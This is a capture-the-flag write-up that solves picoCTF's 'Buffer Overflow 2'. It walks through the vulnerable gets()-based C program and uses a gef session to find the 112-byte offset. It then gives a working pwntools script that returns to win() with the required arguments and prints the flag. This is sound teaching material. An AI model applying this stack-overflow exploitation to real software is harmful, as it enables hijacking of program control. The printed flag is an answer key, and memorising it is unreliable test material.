# Buffer Overflow 2

This time we have to send in arguments

```c
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include <sys/types.h>

#define BUFSIZE 100
#define FLAGSIZE 64

void win(unsigned int arg1, unsigned int arg2) {
  char buf[FLAGSIZE];
  FILE *f = fopen("flag.txt","r");
  if (f == NULL) {
    printf("%s %s", "Please create 'flag.txt' in this directory with your",
                    "own debugging flag.\n");
    exit(0);
  }

  fgets(buf,FLAGSIZE,f);
  if (arg1 != 0xCAFEF00D)
    return;
  if (arg2 != 0xF00DF00D)
    return;
  printf(buf);
}

void vuln(){
  char buf[BUFSIZE];
  gets(buf);
  puts(buf);
}

int main(int argc, char **argv){

  setvbuf(stdout, NULL, _IONBF, 0);
  
  gid_t gid = getegid();
  setresgid(gid, gid, gid);

  puts("Please enter your string: ");
  vuln();
  return 0;
}
```

Another gets function with a buffer size of 100. So let's send a 200 pattern and try to find a offset.

```
gef➤  pattern create 200
[+] Generating a pattern of 200 bytes (n=4)
aaaabaaacaaadaaaeaaafaaagaaahaaaiaaajaaakaaalaaamaaanaaaoaaapaaaqaaaraaasaaataaauaaavaaawaaaxaaayaaazaabbaabcaabdaabeaabfaabgaabhaabiaabjaabkaablaabmaabnaaboaabpaabqaabraabsaabtaabuaabvaabwaabxaabyaab
[+] Saved as '$_gef0'
gef➤  r
Starting program: /home/user1/picoCTF/buffer/buffer_overflow_2
[Thread debugging using libthread_db enabled]
Using host libthread_db library "/lib/x86_64-linux-gnu/libthread_db.so.1".
Please enter your string:
aaaabaaacaaadaaaeaaafaaagaaahaaaiaaajaaakaaalaaamaaanaaaoaaapaaaqaaaraaasaaataaauaaavaaawaaaxaaayaaazaabbaabcaabdaabeaabfaabgaabhaabiaabjaabkaablaabmaabnaaboaabpaabqaabraabsaabtaabuaabvaabwaabxaabyaab
aaaabaaacaaadaaaeaaafaaagaaahaaaiaaajaaakaaalaaamaaanaaaoaaapaaaqaaaraaasaaataaauaaavaaawaaaxaaayaaazaabbaabcaabdaabeaabfaabgaabhaabiaabjaabkaablaabmaabnaaboaabpaabqaabraabsaabtaabuaabvaabwaabxaabyaab

Program received signal SIGSEGV, Segmentation fault.
[!] Cannot access memory at address 0x62616164
gef➤  pattern search 0x62616164
[+] Searching for '64616162'/'62616164' with period=4
[+] Found at offset 112 (little-endian search) likely
```
At offset 112 it is taking an address, we can send our win function's address and see what happens.

```
gef➤  disass win
Dump of assembler code for function win:
   0x08049296 <+0>:     endbr32
   0x0804929a <+4>:     push   ebp
   ...
   0x0804930c <+118>:   cmp    DWORD PTR [ebp+0x8],0xcafef00d
   0x08049313 <+125>:   jne    0x804932f <win+153>
   0x08049315 <+127>:   cmp    DWORD PTR [ebp+0xc],0xf00df00d
   0x0804931c <+134>:   jne    0x8049332 <win+156>
   ...
gef➤  r < <(python3 -c "import sys; from pwn import p32; sys.stdout.buffer.write(b'A'*112 + p32(0x08049296))")
Starting program: /home/user1/picoCTF/buffer/buffer_overflow_2 < <(python3 -c "import sys; from pwn import p32; sys.stdout.buffer.write(b'A'*112 + p32(0x08049296))")
[Thread debugging using libthread_db enabled]
Using host libthread_db library "/lib/x86_64-linux-gnu/libthread_db.so.1".
Please enter your string:
AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA��
Please create 'flag.txt' in this directory with your own debugging flag.
[Inferior 1 (process 32818) exited normally]
```
Alright now we can access the win function. but now we need to figure out where we can send the arguments. We look back at the win function and we see it is comparing two hex. let's set breakpoints there.

```
gef➤  b *0x0804930c
Breakpoint 1 at 0x804930c
gef➤  r < <(python3 -c "import sys; import pwn; sys.stdout.buffer.write(b'A'*112+pwn.p32(0x08049296)+b'\n')")
Starting program: /home/user1/picoCTF/buffer/buffer_overflow_2 < <(python3 -c "import sys; import pwn; sys.stdout.buffer.write(b'A'*112+pwn.p32(0x08049296)+b'\n')")
[Thread debugging using libthread_db enabled]
Using host libthread_db library "/lib/x86_64-linux-gnu/libthread_db.so.1".
Please enter your string:
AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA��

Breakpoint 1, 0x0804930c in win ()
gef➤  x/b $ebp+0x8
0xffffcdf4:     "A\235\375\367\242)\332\367\350\003"
```
Random stuff, let's try putting 50 B's afterwards
```
gef➤  r < <(python3 -c "import sys; import pwn; sys.stdout.buffer.write(b'A'*112+pwn.p32(0x08049296)+b'B'*50+b'\n')")
Starting program: /home/user1/picoCTF/buffer/buffer_overflow_2 < <(python3 -c "import sys; import pwn; sys.stdout.buffer.write(b'A'*112+pwn.p32(0x08049296)+b'B'*50+b'\n')")
[Thread debugging using libthread_db enabled]
Using host libthread_db library "/lib/x86_64-linux-gnu/libthread_db.so.1".
Please enter your string:
AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA�BBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBB

Breakpoint 1, 0x0804930c in win ()
gef➤  x/s $ebp+0x8
0xffffcdf4:     'B' <repeats 46 times>
```
Alright from 8th position we have 46 B's. So our input for this starts from 4th position. And looking at the win function the other argument is immedietely after these 4 bytes. So our new input is
```
gef➤  r < <(python3 -c "import sys; from pwn import p32; sys.stdout.buffer.write(b'A'*112+p32(0x08049296)+b'A'*4+p32(0xCAFEF00D)+p32(0xF00DF00D)+b'\n')")
Starting program: /home/user1/picoCTF/buffer/buffer_overflow_2 < <(python3 -c "import sys; from pwn import p32; sys.stdout.buffer.write(b'A'*112+p32(0x08049296)+b'A'*4+p32(0xCAFEF00D)+p32(0xF00DF00D)+b'\n')")
[Thread debugging using libthread_db enabled]
Using host libthread_db library "/lib/x86_64-linux-gnu/libthread_db.so.1".
Please enter your string:
���AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA�AAAA
flag{lmao_dies}
Program received signal SIGSEGV, Segmentation fault.
```
That's it. Let's set this up
```python
import pwn
r = pwn.remote("saturn.picoctf.net", 55424)
print(r.recvline())
r.sendline(b'A' * 112 + pwn.p32(0x08049296)+ b'A'*4 + pwn.p32(0xCAFEF00D) + pwn.p32(0xF00DF00D))
r.interactive()
```
```
[+] Opening connection to saturn.picoctf.net on port 55424: Done
b'Please enter your string: \n'
[*] Switching to interactive mode
\xf0\xfe\xcaAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA\x96\x92\x0AAAA
$ picoCTF{argum3nt5_4_d4yZ_59cd5643}[*] Got EOF while reading in interactive
```


